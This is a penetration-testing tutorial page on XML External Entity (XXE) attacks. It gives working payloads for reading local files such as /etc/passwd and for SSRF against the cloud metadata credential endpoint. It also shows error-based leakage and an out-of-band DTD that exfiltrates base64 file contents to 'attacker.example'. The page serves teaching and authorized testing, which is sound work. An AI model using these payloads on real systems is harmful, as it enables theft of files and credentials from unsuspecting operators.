---
title: "XML External Entity (XXE): file disclosure, SSRF, and out-of-band exfiltration via DTDs"
description: Exploiting XML parsers that resolve external and parameter entities—reading local files, reaching internal services, and exfiltrating data out-of-band through a malicious DTD when parsed results are blind.
keywords:
  - XXE
  - XML external entity
  - parameter entity
  - OOB XXE
  - blind XXE
  - SSRF
  - file disclosure
---

# XML External Entity (XXE)

An **XXE** vulnerability exists when an application parses attacker-controlled XML with a parser that resolves **external entities**. XML's DTD syntax lets a document declare entities whose value is the contents of a URI—`file://`, `http://`, `ftp://`, PHP wrappers—and an unhardened parser faithfully dereferences them. The attacker's entity reference is spliced into the parsed document, turning an XML endpoint into a primitive for **local file read**, **server-side request forgery**, and **data exfiltration**.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Submitting crafted XML against systems without written authorization is unlawful.

## Overview

Any endpoint that accepts XML is a candidate: SOAP and XML-RPC services, SAML single sign-on, REST APIs that accept `application/xml`, file uploads that are secretly XML containers (SVG, DOCX, XLSX, SVG-based image processors), and RSS/sitemap ingestors. The attack surface is defined by the **parser configuration**, not the transport.

A minimal in-band payload declares an external general entity and references it where parsed text is reflected:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order><item>&xxe;</item></order>
```

If the `item` value is echoed back, the response contains the file. The vulnerability is entirely a property of the parser honoring `SYSTEM` entities; the application never intended to read a file.

## Primitives

### Local file read

`file://` entities disclose any file the service account can read—`/etc/passwd`, application source, configuration with database credentials, cloud SDK credential files. On platforms with extra URI schemes the reach widens:

- **PHP wrappers:** `php://filter/convert.base64-encode/resource=index.php` base64-encodes source so binary or XML-breaking bytes survive the parse.
- **Java:** `file:///` directory listings on some parsers, and `jar:`/`netdoc:` handlers.
- **Expect / other schemes:** rarely enabled, occasionally present.

### Server-side request forgery

An `http://` entity makes the server issue a request from its own network position:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

This reaches cloud metadata endpoints, internal admin panels, and unauthenticated services behind the perimeter. The fetch primitive itself is shared with [Request forgery](../request-forgery/index.md); here XML is the delivery vehicle.

## Blind and out-of-band XXE

Most real targets are **blind**: the parsed entity is never reflected. Two techniques recover a channel.

### Error-based disclosure

Force the parser to include file contents in an error message by referencing a non-existent resource built from the target file. Using a **parameter entity** (`%`-prefixed, valid inside the DTD) and a malicious external DTD:

```xml
<!-- attacker.dtd hosted on attacker.example -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open a path that contains the file's contents and leaks them in the resulting error. This works where general-entity references are stripped but parameter entities in an external DTD are still processed.

### Out-of-band exfiltration

When neither reflection nor errors are available, exfiltrate over a channel the attacker controls. The in-document DTD cannot nest entity declarations inside an entity value, so the standard pattern loads an **external DTD**:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://attacker.example/x.dtd">
  %remote;
  %exfil;
]>
<data>&send;</data>
```

```xml
<!-- x.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.example/?d=%file;'>">
```

The target's base64-encoded file contents arrive as a query-string parameter in the attacker's access log or an interaction server (Burp Collaborator, `interactsh`). Base64 avoids newlines and reserved characters that would otherwise break the URI or the XML.

### Local DTD reuse

Where outbound network access is blocked, an **existing local DTD** on the filesystem can be repurposed: load a known system DTD, then redefine one of its internal parameter entities to trigger error-based leakage—no attacker-hosted file required.

## Delivery variants

- **SVG upload:** image processors (ImageMagick, librsvg, batik) parse uploaded SVG as XML; embed the DTD in the SVG.
- **Office documents:** DOCX/XLSX/PPTX are ZIP archives of XML; inject into one of the inner parts and re-zip.
- **SOAP/SAML:** inject into the body or a header; SAML parsers historically processed DTDs.
- **Content-type switch:** an endpoint expecting JSON may also accept XML if the body is re-labeled `application/xml`.

## Exploitation workflow

1. **Confirm XML is parsed.** Submit well-formed XML and a deliberately malformed document; a parser error distinguishes XML handling from opaque passthrough.
2. **Test entity resolution** with a harmless in-band entity, then an OOB entity that pings an interaction server—a callback confirms external resolution even when nothing is reflected.
3. **Escalate** to file read via `file://`/`php://filter`, or to SSRF via `http://` against internal targets.
4. **Go blind** with error-based or OOB DTD techniques when no output returns.

## Tools

- **[Burp Suite](https://portswigger.net/burp)** (Repeater, plus the Collaborator client) for crafting payloads and catching OOB callbacks.
- **[interactsh](https://github.com/projectdiscovery/interactsh)** as a standalone OOB interaction server for DNS/HTTP exfiltration.
- **[XXEinjector](https://github.com/enjoiz/XXEinjector)** automates file retrieval and OOB exfiltration, including hosting the external DTD.
- **[docem](https://github.com/whitel1st/docem)** / `oxml_xxe` for embedding payloads into Office and SVG containers.

## References

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger Web Security Academy: XXE injection](https://portswigger.net/web-security/xxe)
- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
